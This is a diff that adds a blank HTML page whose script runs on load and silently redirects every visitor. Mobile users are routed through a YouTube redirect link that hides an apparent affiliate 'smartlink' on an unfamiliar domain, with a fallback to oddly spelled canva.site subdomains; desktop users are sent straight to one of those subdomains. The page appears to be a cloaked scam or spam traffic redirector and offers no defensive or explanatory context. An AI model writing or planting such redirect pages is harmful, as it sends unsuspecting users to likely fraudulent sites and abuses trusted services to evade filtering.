@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <title></title>
+    </head>
+    <body>
+        <script type="text/javascript">
+            window.onload = function() {
+
+                var desktopFallback = "https://clivvckhnerevnow.my.canva.site",
+                mobileFallback = "https://clvickvhverevnnow.my.canva.site",
+                app = "vnd.youtube:www.youtube.com/redirect?event=comments&redir_token=QUFFLUhqbXN0OHFBY2p2d2VYcmtfWFo5bVk1bmRuZVNiQXxBQ3Jtc0trbmNvcGVySThwcDBjcWF6SHVPVndiTEgyeFRMRlJKLTRnMV9kSzZBN3hBZUVkUmVsN1d3RngtNmc4ZlYyZWFqbDhqZ1J1Y2Q2Rktsb1pyWXVSejh0T21zMDVZVEhUSko0ZGlNUWp6ZmhpVkkxZmdJbw&q=https%3A%2F%2Fsecuredsmcd.com%2Fsmartlink%2F%3Fa%3D209909%26sm%3D36999%26co%3D270025%26mt%3D19%26s1%3DDon&html_redirect=1";
+
+                if( /Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ) {
+                    window.location = app;
+                    window.setTimeout(function() {
+                        window.location = mobileFallback;
+                    }, 25);
+                } else {
+                    window.location = desktopFallback;
+                }
+
+                function killPopup() {
+                    window.removeEventListener('pagehide', killPopup);
+                }
+
+                window.addEventListener('pagehide', killPopup);
+
+            };
+        </script>
+    </body>
+</html>
